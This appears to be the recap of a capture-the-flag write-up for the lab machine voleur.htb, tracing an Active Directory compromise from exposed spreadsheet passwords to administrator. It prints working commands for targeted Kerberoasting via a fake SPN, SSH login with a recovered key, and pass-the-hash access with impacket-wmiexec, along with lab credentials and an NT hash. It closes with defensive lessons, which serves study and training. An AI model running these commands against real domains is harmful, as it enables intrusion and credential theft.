#### Recap
SMB required Kerberos because NTLM was disabled. A weakly protected workbook exposed several account passwords, including one for a deleted account. BloodHound showed that svc_ldap could modify the svc_winrm service principal name, exposing that account to offline password guessing.
```bash
# Service principal name exposure
bloodyad -d voleur.htb -k --host dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set object svc_winrm servicePrincipalName -v 'http/fake'

# Kerberos service ticket assessment
netexec ldap dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k --kerberoasting svc_winrm.hashLDAP
```
The recovered svc_winrm password provided access through the WinRM client's Kerberos ticket cache. The session exposed the user flag.

The Restore_Users delegation made a deleted account reachable again, and the workbook contained its password. Group membership exposed DPAPI files containing another user's credentials. The next support tier exposed an SSH private key associated with the backup service account.
```bash
ssh -p 2222 -i id_rsa svc_backup@dc.voleur.htb
```
The backup account's Linux environment had the Windows volume mounted and exposed backups of the Active Directory database and SYSTEM hive. Their disclosure led to administrator access and the root flag.
```bash
impacket-wmiexec voleur.htb/administrator@dc.voleur.htb -no-pass -hashes :e656e07c56d831611b577b160b259ad2 -k
```


Key Concepts:
1. Password protection alone is inadequate for spreadsheets containing credentials.
2. WriteSPN can expose a target account to Kerberoasting.
3. Review which principals can restore accounts from the AD Recycle Bin.
4.  Protect DPAPI credential files and master keys as sensitive data.
5.  An SSH public key comment may provide a lead about ownership, but it is not authoritative.
6. Verify the authentication mechanism used by remote administration tools when NTLM is disabled.
